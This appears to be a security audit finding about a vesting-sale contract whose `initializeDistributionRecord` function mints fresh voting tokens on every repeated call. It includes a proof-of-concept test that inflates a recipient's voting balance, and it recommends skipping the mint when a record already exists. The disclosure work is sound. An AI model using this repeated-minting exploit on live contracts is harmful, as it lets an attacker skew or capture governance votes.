# Each time `initializeDistributionRecord` in `PriceTierVestingSale_2_0` is called new voting tokens are minted

## Summary

Each time `initializeDistributionRecord` in `PriceTierVestingSale_2_0` is called, new voting token are minted 


## Vulnerability Detail

By calling `initializeDistributionRecord`  in `PriceTierVestingSale_2_0` the `DistributionRecord` of an receiver can be initiated. The problem is that this function can be called multiple times for one recipient and each time voting tokens are minted to his name. This increased his voting power and skews any potential vote based on the amount of voting tokens a user has. Also even if a user claims all his tokens he will still have voting power if his `DistributionRecord` was initated more than once because when claiming his tokens the right amount of voting tokens are burned.  

Add the following POC to the file `TrancheVestingMerkle.test.ts`:

``` solidity
  it.only("A buyer can initialize before claiming", async () => {
    const user = eligible2;
    const distributor = partiallyVestedDistributor;
    const [index, beneficiary, amount] = config.proof.claims[
      user.address
    ].data.map((d) => d.value);
    const proof = config.proof.claims[user.address].proof;

    // 50% of tokens have already vested
    const claimable = BigInt(amount) / 2n;

    await distributor.initializeDistributionRecord(
      index,
      beneficiary,
      amount,
      proof
    );
    let votingTokens = await distributor.balanceOf(user.address);

    console.log(
      "The balance of voting tokens after init 1",
      votingTokens.toBigInt()
    );

    await distributor.initializeDistributionRecord(
      index,
      beneficiary,
      amount,
      proof
    );
    votingTokens = await distributor.balanceOf(user.address);
    console.log(
      "Balance of voting tokens after init 2",
      votingTokens.toBigInt()
    );
  });

## Impact

Attacker can mint as many voting tokens as he wants which renders the voting mechanism useless

Manual Review

## Recommendation

When initiating the `DistributionRecord` for a recipient check if there is a value for its `total`. If so skip the minting of the voting tokens
